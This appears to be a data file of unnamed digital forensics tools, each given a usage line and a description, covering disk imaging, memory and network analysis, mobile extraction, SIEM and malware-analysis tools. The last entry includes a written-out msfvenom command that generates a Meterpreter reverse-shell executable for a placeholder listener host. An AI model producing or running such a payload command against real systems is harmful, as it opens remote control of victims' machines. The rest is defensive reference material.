usage: Analyze disk images to recover files, list file metadata, and create timelines.
description: Open-source collection of command-line tools for analyzing disk images and file systems (NTFS, FAT, ext). Enables recovery of deleted files, metadata examination, and timeline generation.

usage: GUI-based digital forensics platform for analyzing disk images and generating reports.
description: Open-source digital forensics platform built on The Sleuth Kit. Provides a graphical interface for analyzing hard drives, smartphones, and media. Supports timeline analysis, keyword search, and hash filtering.

usage: Analyze memory dumps to extract running processes, network connections, and artifacts.
description: Open-source memory forensics framework for incident response and malware analysis. Supports Windows, Linux, and macOS memory images. Extracts processes, DLLs, network connections, registry hives, and more.

usage: Capture and analyze network traffic for forensic investigation of network activity.
description: Open-source network protocol analyzer used in live capture and offline analysis. Supports hundreds of protocols and provides deep inspection of packet data. Widely used in network forensics and incident response.

usage: Create forensic images of hard drives, removable media, and folders for forensic analysis.
description: Free disk imaging tool from AccessData. Creates forensic images in multiple formats (E01, DD, AFF) and allows preview of file system contents without altering evidence. Supports mounting images and exporting files.

usage: Extract useful forensic artifacts such as email addresses, URLs, and credit card numbers from disk images.
description: Open-source digital forensics tool that scans disk images, files, and directories for features such as email addresses, URLs, credit card numbers, and GPS coordinates. Does not parse the file system, making it fast and capable of finding artifacts in unallocated space.

usage: Recover deleted files from disk images based on file headers and footers.
description: Open-source file carving tool originally developed by the US Air Force. Recovers files from disk images by scanning for known file headers, footers, and internal data structures. Supports numerous file types including images, documents, and executables.

usage: File carving tool to recover deleted files from disk images using configurable patterns.
description: Fast file carver based on Foremost. Uses a configurable file to define header and footer patterns for file recovery. More efficient than Foremost for large images. Widely used in digital forensics for recovering deleted files from disk images.

usage: Create super timelines from digital evidence for forensic analysis.
description: Open-source tool for creating super timelines from various log files and digital evidence. Supports hundreds of input formats including Windows Event Logs, browser history, registry hives, and more. Essential for timeline analysis in incident response.

usage: Advanced memory forensics framework for analyzing memory images from various operating systems.
description: Open-source memory forensics framework forked from Volatility. Provides advanced memory analysis capabilities with a focus on speed and modularity. Supports Windows, Linux, and macOS memory images with an extensive plugin library.

usage: Analyze network traffic captures to extract files, credentials, and communications.
description: Open-source network forensic analysis tool (NFAT) for Windows. Detects operating systems, sessions, hostnames, and open ports from PCAP files. Reassembles transmitted files and credentials from captured traffic. Used in network forensics and incident response.

usage: Extract and analyze data from mobile devices for forensic investigations.
description: Industry-leading mobile forensic tool for extracting data from smartphones, tablets, and feature phones. Supports physical, logical, and file system extractions. Decodes app data, messages, GPS coordinates, and deleted content. Widely used by law enforcement.

usage: Comprehensive mobile device forensics for extracting and analyzing data from smartphones and cloud services.
description: Commercial mobile forensic software supporting physical, logical, and cloud extractions from iOS, Android, and feature phones. Extracts messages, call logs, app data, and cloud backups. Includes advanced analytics and timeline features.

usage: End-to-end digital investigation platform for collecting and analyzing evidence from computers, mobile devices, and cloud services.
description: Commercial digital forensics platform supporting acquisition and analysis of Windows, macOS, Linux, iOS, and Android devices. Includes cloud evidence collection, artifact recovery, and AI-assisted analysis. Popular in law enforcement investigations.

usage: Acquire memory from live Linux systems for forensic analysis.
description: Loadable kernel module for acquiring volatile memory from Linux systems. Supports full memory acquisition to a file or over a network connection. Minimizes the tool's footprint to reduce its impact on the system under investigation.

usage: Analyze and extract firmware images and embedded file systems.
description: Open-source tool for analyzing, reverse engineering, and extracting firmware images. Identifies embedded files and executable code using entropy analysis and file signature scanning. Widely used in IoT forensics and embedded systems analysis.

usage: Extract and analyze Windows registry data for forensic artifacts.
description: Open-source registry analysis tool for parsing Windows registry hive files. Uses plugins to extract specific forensic artifacts such as user activity, installed software, USB device history, and network connections. Essential for Windows forensic investigations.

usage: Perform host-based forensic analysis and investigate compromised systems.
description: Free endpoint security tool from FireEye/Mandiant. Collects and analyzes host data including processes, network connections, registry entries, and file metadata. Detects indicators of compromise (IOCs) and supports memory analysis. Used in incident response.

usage: Network discovery and security auditing for identifying hosts and services in forensic investigations.
description: Open-source network scanner for host discovery, port scanning, service version detection, and OS fingerprinting. Essential for network forensics and incident response. Supports scripting via the Nmap Scripting Engine (NSE) for advanced detection.

usage: Capture network packets from the command line for network forensics.
description: Powerful command-line packet analyzer for Unix-like systems. Captures network traffic and saves to PCAP format for later analysis. Supports Berkeley Packet Filter (BPF) syntax for filtering traffic. Fundamental tool in network forensics and incident response.

usage: Comprehensive forensic live distribution for conducting digital forensic investigations.
description: Computer Aided INvestigative Environment - Linux live distribution dedicated to digital forensics. Includes a curated collection of forensic tools and a forensic-friendly interface. Mounts storage devices in read-only mode by default to preserve evidence integrity.

usage: Incident response and digital forensics workstation with pre-installed tools.
description: SANS Investigative Forensic Toolkit - free Linux workstation with pre-installed forensic tools. Includes Sleuth Kit, Volatility, Plaso, and hundreds of other tools. Used for incident response, malware analysis, and digital forensics. Regularly updated by SANS.

usage: Comprehensive commercial digital forensics platform for enterprise investigations.
description: Industry-standard commercial digital forensics software by OpenText. Supports acquisition, analysis, and reporting for computers, mobile devices, and cloud storage. Produces court-admissible evidence. Used extensively in law enforcement and corporate investigations.

usage: Advanced commercial digital forensics and data recovery tool.
description: Highly efficient commercial computer forensics software. Supports disk and partition analysis, file recovery, and evidence management. Known for its speed, low resource usage, and comprehensive feature set. Widely used in law enforcement and corporate forensics.

usage: Wireless network security auditing and password recovery for forensic investigations of Wi-Fi networks.
description: Open-source suite of tools for assessing Wi-Fi network security. Used in forensic investigations to analyze wireless network traffic, capture packets, and recover WEP/WPA/WPA2 passwords. Essential for wireless forensics.

usage: Visual link analysis and open source intelligence (OSINT) for mapping relationships in investigations.
description: Commercial OSINT and link analysis tool for visualizing relationships between people, organizations, domains, and infrastructure. Uses transforms to gather intelligence from various sources. Widely used in cyber investigations and threat intelligence.

usage: Reverse engineer malware and analyze executable binaries for forensic investigations.
description: Free open-source reverse engineering framework developed by the NSA. Supports disassembly, decompilation, and analysis of executables across multiple architectures. Essential for malware analysis in digital forensics. Includes a powerful scripting API.

usage: Advanced disassembler and debugger for reverse engineering malware and firmware.
description: Industry-standard commercial disassembler and debugger for binary analysis. Supports hundreds of processor architectures and file formats. Used extensively in malware analysis, vulnerability research, and digital forensics. Includes the Hex-Rays decompiler.

usage: Blockchain analytics for investigating cryptocurrency transactions in financial crimes.
description: Commercial blockchain analytics platform for tracing cryptocurrency transactions across Bitcoin, Ethereum, and other chains. Used by law enforcement and financial institutions to investigate fraud, money laundering, and ransomware payments. Links transactions to real-world entities.

usage: Windows-based malware analysis and reverse engineering environment.
description: Free Windows-based security distribution for malware analysis and reverse engineering. Includes tools such as x64dbg, Ghidra, Wireshark, and numerous utilities. Provides a consistent, reproducible environment for forensic malware analysis on Windows.

usage: Compute and audit cryptographic hashes for file integrity verification in forensic investigations.
description: Open-source tool for computing MD5, SHA1, SHA256, and other hashes recursively. Supports audit mode for verifying that files match previously computed hashes. Essential for evidence integrity verification in digital forensics.

usage: Extract and analyze metadata from files including images, documents, and audio files.
description: Perl-based open-source tool for reading and writing metadata in a wide variety of file types. Extracts EXIF, IPTC, XMP, and other metadata from images, documents, audio, and video files. Valuable for recovering geolocation data and identifying file origins.

usage: Decode and analyze mobile device data extracted by UFED for forensic reporting.
description: Companion tool to Cellebrite UFED for decoding and analyzing extracted mobile device data. Provides advanced analytics including timeline reconstruction, social media analysis, and pattern recognition. Used extensively in law enforcement mobile forensics.

usage: Scan networks for IoT devices with default credentials to identify security vulnerabilities.
description: Open-source tool for scanning networks to identify IoT devices using factory default credentials. Useful in IoT forensic investigations to identify potentially compromised devices. Detects a wide range of consumer IoT devices.

usage: AI-driven analysis of security events using deep learning for automated clustering and investigation.
description: AI-powered security event analysis tool using deep learning to cluster and contextualize security events. Assists analysts in prioritizing incidents by learning normal vs. abnormal behavior patterns. Represents the intersection of AI and digital forensics.

usage: Web-based framework providing links to OSINT tools organized by investigation type.
description: Web-based collection of OSINT tools organized by investigation category. Covers people, email, domains, social networks, dark web, geolocation, and more. Useful starting point for investigators gathering open-source intelligence.

usage: Endpoint visibility and rapid digital forensic response across enterprise environments.
description: Open-source endpoint visibility and digital forensics platform. Collects forensic artifacts, monitors endpoints, and hunts for threats at scale. Uses VQL (Velociraptor Query Language) for flexible artifact collection. Suitable for enterprise incident response.

usage: Identify and classify malware samples using pattern-based rules.
description: Open-source pattern matching tool for malware identification and classification. Uses rules with string patterns and conditions to detect malware families. Widely used in malware analysis, threat hunting, and incident response. Integrates with many security platforms.

usage: Automated malware analysis in an isolated sandbox environment.
description: Open-source automated malware analysis system. Executes files in an isolated environment and monitors behavior including API calls, network connections, and file system changes. Produces detailed reports on malware behavior. Essential for malware forensics.

usage: Network threat detection and IDS/IPS for monitoring network traffic for malicious activity.
description: High-performance open-source network threat detection engine. Functions as an IDS, IPS, and network security monitoring tool. Detects intrusions, malware, and policy violations in real-time. Supports multi-threading for high-speed traffic analysis.

usage: Index and search large volumes of forensic log data for rapid investigation.
description: Open-source distributed search and analytics engine used in forensic log management. Enables rapid searching through large volumes of event logs, network data, and forensic artifacts. Core component of the ELK stack for forensic data analysis.

usage: Visualize forensic log data and create dashboards for investigation and analysis.
description: Open-source data visualization and exploration tool for Elasticsearch. Creates interactive dashboards for visualizing forensic log data, network traffic, and security events. Part of the ELK stack used extensively in forensic data analytics and SIEM deployments.

usage: Search, monitor, and analyze machine-generated data for security investigations and forensics.
description: Commercial data analytics platform widely used for security information and event management (SIEM). Ingests and indexes log data from diverse sources. Used in forensic investigations for searching events, detecting anomalies, and reconstructing incident timelines.

usage: Remote live forensics platform for collecting digital evidence from endpoints at scale.
description: Open-source incident response framework for remote forensics. Allows investigators to collect forensic artifacts, search for files, and hunt for threats across thousands of endpoints simultaneously. Developed by Google. Uses a client-server architecture.

usage: Scan systems for indicators of compromise (IOCs) to identify malware infections.
description: Free tool from Mandiant for collecting host system data and comparing against indicators of compromise. Searches for file hashes, registry keys, IP addresses, and other IOCs. Useful in incident response for quickly identifying compromised systems.

usage: Collaborative timeline analysis for forensic investigations.
description: Open-source tool for collaborative forensic timeline analysis. Allows investigators to import, search, and annotate forensic timelines. Integrates with Plaso for automated timeline generation. Supports multiple simultaneous investigators working on the same case.

usage: Analyze mobile device backups and extractions within the Autopsy forensics platform.
description: Mobile forensics module for Autopsy that parses Android and iOS device extractions. Recovers messages, call logs, contacts, and app data from mobile backups. Integrates with the Autopsy timeline and reporting features for comprehensive device analysis.

usage: Audit and monitor AWS account activity for cloud forensic investigations.
description: AWS service that records API calls made on an account for governance, compliance, and forensic investigations. Logs user activity and resource changes. Essential for cloud forensics on AWS infrastructure. Integrates with AWS Security Hub and GuardDuty.

usage: Cloud-native SIEM for security monitoring and forensic investigation of Azure environments.
description: Microsoft's cloud-native SIEM and SOAR platform. Collects data from Azure resources, Office 365, and connected sources. Uses AI and machine learning to detect threats and investigate incidents. Provides forensic investigation capabilities for cloud and hybrid environments.

commands: msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > payload.exe
usage: Penetration testing and exploit development framework used in forensic investigation of vulnerabilities.
description: Open-source penetration testing framework widely used in cybersecurity investigations. Includes hundreds of exploits, payloads, and auxiliary modules. Used in forensics to understand attack vectors, reproduce incidents, and test defensive controls.
